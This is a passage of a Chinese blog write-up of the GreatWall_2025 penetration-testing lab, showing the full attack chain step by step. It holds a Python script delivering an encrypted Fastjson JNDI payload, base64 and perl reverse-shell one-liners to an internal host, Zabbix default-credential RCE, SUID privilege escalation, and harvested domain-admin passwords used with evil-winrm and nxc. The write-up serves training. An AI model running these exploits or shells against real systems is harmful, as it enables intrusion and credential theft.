+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219996.png" srcset="/img/loading.gif" lazyload alt="image-20260313214435805"></p>
+<p>使用雷电模拟器打开（这里记得把root关了，开了root好像打不开）</p>
+<p>拖到安卓模拟器进行安装，如果是 root 的机器打开会闪退，使用 magisk 工具的 root 排除模块，将该 APP 所排除就可以正常打开了。</p>
+<p>按照教程配置好代理，抓包：<a target="_blank" rel="noopener" href="https://blog.csdn.net/biao2426618262/article/details/147336036">https://blog.csdn.net/biao2426618262/article/details/147336036</a></p>
+<p>数据包存在加密，需要反编译 apk，编译之前先使用 APK 查壳工具，发现没有加壳，jadx打开apk分析一下</p>
+<p>请求数据包的加密逻辑在 <code>com.example.Mobile.MainActivity#sendLoginRequest</code> 方法中，查看其 Simple 模块的代码，该代码是完整的代码，从 smali 代码中提取到硬编码的 RSA 公钥和服务端地址 <code>http://172.16.22.88:8080/api/login</code>，</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219934.png" srcset="/img/loading.gif" lazyload alt="image-20260313193546922"></p>
+<p>加密逻辑：</p>
+<ol>
+<li>生成 128-bit AES 密钥</li>
+<li>使用 <code>AES/GCM/NoPadding</code> 加密登录 JSON 数据</li>
+<li>加密后数据格式：<code>IV(12字节) + 密文 + GCM Tag(16字节)</code></li>
+<li>使用 <code>RSA/ECB/PKCS1Padding</code> 和硬编码公钥加密 AES 密钥</li>
+<li>发送 POST 请求：Body 为 Base64 编码的加密数据，Header <code>X-Encrypted-Key</code> 为 Base64 编码的加密 AES 密钥</li>
+</ol>
+<p>其加密方法实现逻辑如下：</p>
+<ul>
+<li>先把 username、password 封装成 LoginData(username, password)，再用 JSON.toJSONString 生成明文 JSON。</li>
+<li>随机生成 AES-128 密钥：KeyGenerator.getInstance(“AES”) + init(128) + generateKey()。</li>
+<li>使用 AES&#x2F;GCM&#x2F;NoPadding 加密明文 JSON：Cipher.init(ENCRYPT_MODE, aesKey)，由库生成随机 IV。cipher.doFinal(plaintext) 得到密文（包含 GCM tag）。</li>
+<li>IV || ciphertext 拼接（IV 在前）。</li>
+<li>将 IV+ciphertext 做 Base64，并去除 \n、\r，这个字符串就是请求体。</li>
+</ul>
+<p>其中 AES 的密钥用硬编码 RSA 公钥加密：</p>
+<ul>
+<li>公钥是硬编码的 X.509 Base64 字符串（见字节码常量）。</li>
+<li>RSA&#x2F;ECB&#x2F;PKCS1Padding 加密 aesKey.getEncoded()。</li>
+<li>将加密后的 AES 密钥 Base64 后放到请求头 X-Encrypted-Key。</li>
+<li>请求头 Content-Type: application&#x2F;octet-stream，POST body 发送的是 Base64 字符串（IV+ciphertext）。</li>
+</ul>
+<p>由于其 AES 密钥是通过 RSA 算法加密的，硬编码的是 RSA 公钥，如若解密需要 RSA 私钥，该私钥一般存储在服务器上，所以只有服务器可以解密该数据。</p>
+<p>但是我们有了 RSA 公钥只有，可以任意加密请求体的内容</p>
+<h2 id="Fastjson-RCE"><a href="#Fastjson-RCE" class="headerlink" title="Fastjson RCE"></a>Fastjson RCE</h2><p>从包名信息来看，应该是打 fastjson，可以看到版本1.2.24</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219361.png" srcset="/img/loading.gif" lazyload alt="image-20260313225310038"></p>
+<p>使用 javachains 项目生成反序列化注入的内存马，由于该主机不出网故而需要在入口机器部署 java-chains 项目</p>
+<p>下载<a target="_blank" rel="noopener" href="https://github.com/vulhub/java-chains">java-chains-linux-amd64.tar.gz</a>，上传到入口机器上面，运行java-chains</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">scp -i ./rsa_key /home/matrix/Desktop/VulnExploit/javachains-linux-amd64.tar.gz root@8.147.69.40:/matrix/<br><br>tar -zxvf javachains-linux-amd64.tar.gz<br><span class="hljs-built_in">chmod</span> 777 start.sh<br>./start.sh<br></code></pre></td></tr></table></figure>
+
+<p>通过socks5登录<a target="_blank" rel="noopener" href="http://172.16.22.12:8011/%EF%BC%8C%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BC%9A%E5%9C%A8%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%89%93%E5%8D%B0">http://172.16.22.12:8011/，账号密码会在控制台打印</a></p>
+<p>这里打 fastjson 1.2.24 JdbcRowSetImpl 反序列化</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219219.png" srcset="/img/loading.gif" lazyload alt="image-20260313200641485"></p>
+<p>点击生成，部署好恶意 RMI 服务：</p>
+<figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">rmi:</span><span class="hljs-comment">//127.0.0.1:50388/cae2f8</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219752.png" srcset="/img/loading.gif" lazyload alt="image-20260313200816986"></p>
+<p>让 AI 写个构造加密请求包的 py 脚本：</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> <span class="hljs-type">json</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> cryptography.hazmat.primitives <span class="hljs-keyword">import</span> serialization, hashes<br><span class="hljs-keyword">from</span> cryptography.hazmat.primitives.<span class="hljs-keyword">asymmetric</span> <span class="hljs-keyword">import</span> padding<br><span class="hljs-keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="hljs-keyword">import</span> Cipher, algorithms, modes<br><span class="hljs-keyword">from</span> cryptography.hazmat.backends <span class="hljs-keyword">import</span> default_backend<br><br># ===== 配置信息 =====<br>SERVER_URL = &quot;http://172.16.22.88:8080/api/login&quot;<br><br># Java 代码中的 RSA 公钥（Base64 格式）<br>PUBLIC_KEY_B64 = (<br>    &quot;MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAnKum2FOeaPQumhLBpRauv+OMB6pkdqACjbZYkzzP8CZgjwEwmKauXLxzur1beldNDlVnUs83CnnvanPIYW3oP56t0SoqDmWviBTBJ2aCjtrztFYjBixZEYJ2Exp9f6cdFuSMiucPyuhwY8AuFWnGPJ3Mwt8L8ouV9Lc6Ptp67fCZ0aHr1BVu+pXvHVktbcmeCt+61dnyd9iXTDZfIQ9rwrDsTlkEYORN0hckpFWvgaoNXhXm60ioLkk/qtPZSjir0bpDL0w0iZ3+wRJLtUOe3KyGx+C00S5w2cM0Zw1XlmRQ08yj1nObVkaVsfEU8sSk/XFVnuCrO9YfQCa1uxm5ZQIDAQAB&quot;<br>)<br><br># ===== <span class="hljs-number">1.</span> 要发送的 <span class="hljs-type">JSON</span> 明文 =====<br>plaintext = &quot;&quot;&quot;&#123;<br>    &quot;@<span class="hljs-keyword">type</span>&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;,<br>    &quot;dataSourceName&quot;: &quot;rmi://<span class="hljs-number">172.16</span><span class="hljs-number">.22</span><span class="hljs-number">.12</span>:<span class="hljs-number">50388</span>/cae2f8&quot;,<br>    &quot;autoCommit&quot;: true<br>&#125;&quot;&quot;&quot;<br>print(plaintext)<br><br># ===== <span class="hljs-number">2.</span> 生成随机 AES key (<span class="hljs-number">128</span>-<span class="hljs-type">bit</span>) =====<br>aes_key = os.urandom(<span class="hljs-number">16</span>)<br><br># ===== <span class="hljs-number">3.</span> AES/GCM 加密 =====<br>iv = os.urandom(<span class="hljs-number">12</span>)  # <span class="hljs-number">12</span> 字节 IV<br>encryptor = Cipher(<br>    algorithms.AES(aes_key),<br>    modes.GCM(iv),<br>    backend=default_backend()<br>).encryptor()<br><br>ciphertext = encryptor.<span class="hljs-keyword">update</span>(plaintext.encode(&quot;utf-8&quot;)) + encryptor.finalize()<br>tag = encryptor.tag<br><br># Body = IV + 密文 + GCM tag<br>body_raw = iv + ciphertext + tag<br>body_b64 = base64.b64encode(body_raw).decode(&quot;utf-8&quot;)<br><br># ===== <span class="hljs-number">4.</span> 用 RSA 公钥加密 AES key =====<br>pub_bytes = base64.b64decode(PUBLIC_KEY_B64)<br>public_key = serialization.load_der_public_key(pub_bytes, backend=default_backend())<br><br>enc_key = public_key.encrypt(<br>    aes_key,<br>    padding.PKCS1v15()<br>)<br>enc_key_b64 = base64.b64encode(enc_key).decode(&quot;utf-8&quot;)<br><br># ===== <span class="hljs-number">5.</span> 发送 POST 请求 =====<br>headers = &#123;<br>    &quot;Content-Type&quot;: &quot;application/octet-stream&quot;,<br>    &quot;X-Encrypted-Key&quot;: enc_key_b64,<br>&#125;<br><br>resp = requests.post(SERVER_URL, data=body_b64.encode(&quot;utf-8&quot;), headers=headers, timeout=<span class="hljs-number">10</span>)<br>print(&quot;Status:&quot;, resp.status_code)<br>print(&quot;Response:&quot;, resp.text)<br></code></pre></td></tr></table></figure>
+
+<p>配置好&#x2F;etc&#x2F;proxychains4.conf，运行脚本注入内存马</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">sudo <span class="hljs-keyword">vim</span> /etc/proxychains4.<span class="hljs-keyword">conf</span><br>proxychains -q <span class="hljs-keyword">python</span> <span class="hljs-number">1</span>.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure>
+
+<p>虽然是400但是实际是成功的</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219584.png" srcset="/img/loading.gif" lazyload alt="image-20260313202341291"></p>
+<p>根据javachain提供的信息连接哥斯拉</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219390.png" srcset="/img/loading.gif" lazyload alt="image-20260313202435874"></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219713.png" srcset="/img/loading.gif" lazyload alt="image-20260313202405793"></p>
+<p>也可以用jndi工具内网主机在内网开rmi服务反弹shell</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs dns">root@platform:~/test# java -jar jdni-inject.jar -C &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuMjIuMTIvMjMzMSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -<span class="hljs-keyword">A</span> &quot;<span class="hljs-number">172.16.22.12</span>&quot;<br>[ADDRESS] &gt;&gt; <span class="hljs-number">172.16.22.12</span><br>[COMMAND] &gt;&gt; bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuMjIuMTIvMjMzMSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;<br>----------------------------JNDI Links----------------------------<br>Target environment(Build in JDK whose trustURLCodebase is false and have Tomcat <span class="hljs-number">8</span>+ or SpringBoot <span class="hljs-number">1</span>.<span class="hljs-number">2</span>.x+ in classpath):<br>rmi://<span class="hljs-number">172.16.22.12</span>:<span class="hljs-number">1099</span>/zeeje2<br>Target environment(Build in JDK <span class="hljs-number">1</span>.<span class="hljs-number">8</span> whose trustURLCodebase is true):<br>rmi://<span class="hljs-number">172.16.22.12</span>:<span class="hljs-number">1099</span>/opnefm<br>ldap://<span class="hljs-number">172.16.22.12</span>:<span class="hljs-number">1389</span>/opnefm<br>Target environment(Build in JDK <span class="hljs-number">1</span>.<span class="hljs-number">7</span> whose trustURLCodebase is true):<br>rmi://<span class="hljs-number">172.16.22.12</span>:<span class="hljs-number">1099</span>/daedal<br>ldap://<span class="hljs-number">172.16.22.12</span>:<span class="hljs-number">1389</span>/daedal<br><br>----------------------------Server Log----------------------------<br><span class="hljs-number">2025-12-31</span> <span class="hljs-number">16</span>:<span class="hljs-number">00</span>:<span class="hljs-number">56</span> [JETTYSERVER]&gt;&gt; Listening on <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">8180</span><br><span class="hljs-number">2025-12-31</span> <span class="hljs-number">16</span>:<span class="hljs-number">00</span>:<span class="hljs-number">56</span> [RMISERVER]  &gt;&gt; Listening on <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">1099</span><br><span class="hljs-number">2025-12-31</span> <span class="hljs-number">16</span>:<span class="hljs-number">00</span>:<span class="hljs-number">56</span> [LDAPSERVER] &gt;&gt; Listening on <span class="hljs-number">0.0.0.0</span>:<span class="hljs-number">1389</span><br><span class="hljs-number">2025-12-31</span> <span class="hljs-number">16</span>:<span class="hljs-number">13</span>:<span class="hljs-number">07</span> [RMISERVER]  &gt;&gt; Have connection from /<span class="hljs-number">172.16.22.88</span>:<span class="hljs-number">34710</span><br><span class="hljs-number">2025-12-31</span> <span class="hljs-number">16</span>:<span class="hljs-number">13</span>:<span class="hljs-number">13</span> [RMISERVER]  &gt;&gt; Reading message...<br><span class="hljs-number">2025-12-31</span> <span class="hljs-number">16</span>:<span class="hljs-number">13</span>:<span class="hljs-number">13</span> [RMISERVER]  &gt;&gt; Is RMI.lookup call for zeeje2 <span class="hljs-number">2</span><br><span class="hljs-number">2025-12-31</span> <span class="hljs-number">16</span>:<span class="hljs-number">13</span>:<span class="hljs-number">13</span> [RMISERVER]  &gt;&gt; Sending local classloading reference.<br><span class="hljs-number">2025-12-31</span> <span class="hljs-number">16</span>:<span class="hljs-number">13</span>:<span class="hljs-number">13</span> [RMISERVER]  &gt;&gt; Closing connection<br></code></pre></td></tr></table></figure>
+
+<p>另起shell开监听</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">root</span>@platform:~# nc -lvnp <span class="hljs-number">2331</span><br><span class="hljs-attribute">Listening</span> <span class="hljs-literal">on</span> <span class="hljs-number">0.0.0.0</span> <span class="hljs-number">2331</span><br></code></pre></td></tr></table></figure>
+
+<p>查看 flag2：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">/opt/webapp/ &gt;<span class="hljs-built_in">cat</span> /flag<br><br>flag&#123;5814d11a-d4b2-866e-28ab-c788e3a063b2&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h1><h2 id="Zabbix-RCE"><a href="#Zabbix-RCE" class="headerlink" title="Zabbix RCE"></a>Zabbix RCE</h2><p>目录扫描，发现存在 zabbix 服务：<a target="_blank" rel="noopener" href="http://172.16.22.14/zabbix/index.php">http://172.16.22.14/zabbix/index.php</a></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">dirsearch -u http:<span class="hljs-string">//172.16.22.14/</span> <span class="hljs-params">--proxy</span> socks5:<span class="hljs-string">//127.0.0.1</span><span class="hljs-function">:55555</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219010.png" srcset="/img/loading.gif" lazyload alt="image-20260313202948800"></p>
+<p>使用管理员默认密码 Admin&#x2F;zabbix 登录到 zabbix 后台：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219013.png" srcset="/img/loading.gif" lazyload alt="image-20260313203337011"></p>
+<p>利用后台功能实现 RCE：</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219750.png" srcset="/img/loading.gif" lazyload alt="image-20260313203544879"></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219551.png" srcset="/img/loading.gif" lazyload alt="image-20260313203648153"></p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219009.png" srcset="/img/loading.gif" lazyload alt="image-20260313203712398"></p>
+<p>先在入口机器nc</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvnp <span class="hljs-number">54522</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p>反弹 shell 命令：</p>
+<figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs tcl"><span class="hljs-comment"># bash可以</span><br>bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/172.16.22.12/54523 0&gt;&amp;1&quot;</span><br><span class="hljs-comment"># perl也可以</span><br>perl -e &#x27;use Socket;<span class="hljs-variable">$i</span>=<span class="hljs-string">&quot;172.16.22.12&quot;</span>;<span class="hljs-variable">$p</span>=<span class="hljs-number">54522</span>;<span class="hljs-keyword">socket</span>(S,PF_INET,SOCK_STREAM,getprotobyname(<span class="hljs-string">&quot;tcp&quot;</span>));<span class="hljs-keyword">if</span>(connect(S,sockaddr_in(<span class="hljs-variable">$p</span>,inet_aton(<span class="hljs-variable">$i</span>))))&#123;<span class="hljs-keyword">open</span>(STDIN,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDOUT,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">open</span>(STDERR,<span class="hljs-string">&quot;&gt;&amp;S&quot;</span>);<span class="hljs-keyword">exec</span>(<span class="hljs-string">&quot;/bin/bash -i&quot;</span>);&#125;;&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>没有权限读flag，需要提权,，搜索具有suid权限的程序</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219461.png" srcset="/img/loading.gif" lazyload alt="image-20260313205147964"></p>
+<p>使用 ss 命令进行 SUID 提权，查看 flag3：</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs subunit">ss -a -F /flag.txt<br><span class="hljs-keyword">Error: </span>an inet prefix is expected rather than &quot;flag&#123;a48837f5-a716<span class="hljs-string">-410</span>b<span class="hljs-string">-85</span>af<span class="hljs-string">-6</span>fb0ab4ed56e&#125;&quot;.<br>Cannot parse dst/src address.<br></code></pre></td></tr></table></figure>
+
+<h1 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h1><p>后台“认证”模块中，配置了使用域用户身份进行认证。</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219574.webp" srcset="/img/loading.gif" lazyload alt="图片"></p>
+<p>尝试从数据库中查找配置中的 ldapadmin 用户密码，但当前用户权限无法查看配置文件内容。</p>
+<p>使用拥有 SUID 权限的 ss 命令，也只能查看文件中的第一行内容：（因为文件内容实际上已被 ss 命令解析，因此只有第一行的一部分作为错误消息的一部分返回。）</p>
+<h2 id="mysql弱口令"><a href="#mysql弱口令" class="headerlink" title="mysql弱口令"></a>mysql弱口令</h2><p>最终使用弱口令连接上 zabbix 数据库：zabbix&#x2F;password</p>
+<p>从数据库中查询域用户 ldapadmin 密码信息： ldapadmin&#x2F;XpVLGkQHm8</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219501.png" srcset="/img/loading.gif" lazyload alt="image-20260313205558215"></p>
+<p>获取的域信息：</p>
+<ul>
+<li>域控制器：172.16.22.41</li>
+<li>域名：zwfw.com</li>
+<li>LDAP管理员：CN&#x3D;ldapadmin,OU&#x3D;Zabbix,DC&#x3D;zwfw,DC&#x3D;com</li>
+<li>密码：XpVLGkQHm8</li>
+</ul>
+<p>使用 bloodhound 收集域内信息：</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">proxychains bloodhound-python -u ldapadmin -p XpVLGkQHm8 -d zwfw.com -dc DC.zwfw.com -ns <span class="hljs-number">172.16</span>.<span class="hljs-number">22.41</span> -c all --auth-<span class="hljs-keyword">method</span> <span class="hljs-title function_">ntlm</span> --<span class="hljs-title function_">dns</span>-<span class="hljs-title function_">tcp</span> --<span class="hljs-title function_">zip</span><br></code></pre></td></tr></table></figure>
+
+<p>通过 BloodHoud 工具导入进行分析，发现域用户 ldapadmin 可以远程登录 DC</p>
+<p>使用域用户 ldapadmin 凭据通过 WinRM 登录到 DC</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">proxychains -<span class="hljs-selector-tag">q</span> evil-winrm -<span class="hljs-selector-tag">i</span> <span class="hljs-number">172.16</span>.<span class="hljs-number">22.41</span> -u ldapadmin -<span class="hljs-selector-tag">p</span> XpVLGkQHm8<br></code></pre></td></tr></table></figure>
+
+<p>在注册表中，发现域管密码：administrator &#x2F; a4Z6FcRYSp6LLSGO</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">reg query <span class="hljs-string">&quot;HKEY_LOCAL_MACHINE<span class="hljs-char escape_">\S</span>OFTWARE<span class="hljs-char escape_">\M</span>icrosoft<span class="hljs-char escape_">\W</span>indows NT<span class="hljs-char escape_">\C</span>urrentVersion<span class="hljs-char escape_">\W</span>inlogon&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219211.png" srcset="/img/loading.gif" lazyload alt="image-20260313210312471"></p>
+<p>使用域管用户凭据，查看 flag4：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">proxychains -<span class="hljs-selector-tag">q</span> nxc smb <span class="hljs-number">172.16</span>.<span class="hljs-number">22.41</span> -u administrator -<span class="hljs-selector-tag">p</span> a4Z6FcRYSp6LLSGO <span class="hljs-attr">--codec</span> GBK -<span class="hljs-attribute">x</span> <span class="hljs-string">&#x27;type C:\Users\Administrator\Desktop\flag.txt&#x27;</span><br>SMB         <span class="hljs-number">172.16</span>.<span class="hljs-number">22.41</span>    <span class="hljs-number">445</span>    DC               <span class="hljs-selector-attr">[*]</span> Windows <span class="hljs-number">11</span> / Server <span class="hljs-number">2025</span> Build <span class="hljs-number">26100</span> x64 (name:DC) (domain:zwfw.com) (signing:True) (SMBv1:False) <br>SMB         <span class="hljs-number">172.16</span>.<span class="hljs-number">22.41</span>    <span class="hljs-number">445</span>    DC               <span class="hljs-selector-attr">[+]</span> zwfw.com\administrator:a4Z6FcRYSp6LLSGO (Pwn3d!)<br>SMB         <span class="hljs-number">172.16</span>.<span class="hljs-number">22.41</span>    <span class="hljs-number">445</span>    DC               <span class="hljs-selector-attr">[+]</span> Executed command via wmiexec<br>SMB         <span class="hljs-number">172.16</span>.<span class="hljs-number">22.41</span>    <span class="hljs-number">445</span>    DC               flag&#123;<span class="hljs-number">5</span>af3b42d-ce27-<span class="hljs-number">4</span>a6f-<span class="hljs-number">9037</span>-<span class="hljs-number">29</span>d81346310a&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152219882.png" srcset="/img/loading.gif" lazyload alt="image-20260313210454685"></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?srcid=1009fDV7ngBymYyALY2mKDtu&scene=23&sharer_shareinfo=90dfb4a140cd3a0627a8c1ca10c6d058&mid=2247502347&qq_aio_chat_type=3&sn=0524c0555c71518dccf0e3af0caa0138&idx=1&sharer_shareinfo_first=2799610371ecf9e2587da366d4c54701&__biz=MzkyNDA5NjgyMg==&chksm=c098a7b4cde56fa5f7665832052a8e54a5222302d8f315ef8f8ec7466d0765eb059a2984d6d3&mpshare=1#rd">WP | 云境靶场GreatWall2025</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/91015">春秋云境-GreatWall_2025-先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.qwesec.com/2026/01/yunjing-GreatWall2025.html#DC-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">春秋云境仿真场景 - GreatWall 2025 | X1ongSec</a></p>
+<p><a target="_blank" rel="noopener" href="https://faabbi.github.io/post/GreatWall_2025.html">GreatWall_2025</a></p>
+<p><a target="_blank" rel="noopener" href="https://idocdown.com/app/articles/blogs/detail/17703">春秋云境-GreatWall_2025</a></p>
+<p><a target="_blank" rel="noopener" href="https://faabbi.github.io/post/GreatWall_2025.html">GreatWall_2025</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/PenTest/" class="category-chain-item">PenTest</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" class="print-no-link">#春秋云镜</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>春秋云镜 GreatWall_2025</div>
+      <div>http://example.com/2026/test63/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>sangnigege</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年4月15日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/test34/" title="HCTF2025新生赛">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">HCTF2025新生赛</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/test62/" title="春秋云镜 MagicRelay">
+                        <span class="hidden-mobile">春秋云镜 MagicRelay</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
